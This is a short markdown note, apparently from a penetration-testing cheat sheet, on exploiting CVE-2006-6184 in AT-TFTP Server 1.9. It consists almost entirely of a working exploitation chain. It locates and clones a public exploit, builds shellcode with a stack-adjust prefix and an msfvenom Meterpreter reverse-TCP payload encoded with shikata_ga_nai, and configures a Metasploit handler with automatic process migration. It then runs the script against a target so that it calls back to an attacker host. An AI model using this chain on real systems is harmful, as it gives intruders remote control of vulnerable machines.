---
description: CVE-2006-6184
---

# AT-TFTP Server 1.9

### Exploitation

```bash
# Search exploit
searchsploit AT-TFTP Server 1.9

# Prep
git clone https://github.com/shauntdergrigorian/cve-2006-6184

# Shell dev
perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.119.128 LPORT=1234 R > payload
cat stackadj payload > shellcode
msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python

# Copy it to the python script

# metasploit handler 
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_nonx_tcp
set LHOST 192.168.119.128
set LPORT 1234
# set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j

# Execute
python atftp.py 10.11.1.226 69 192.168.119.128 9
```
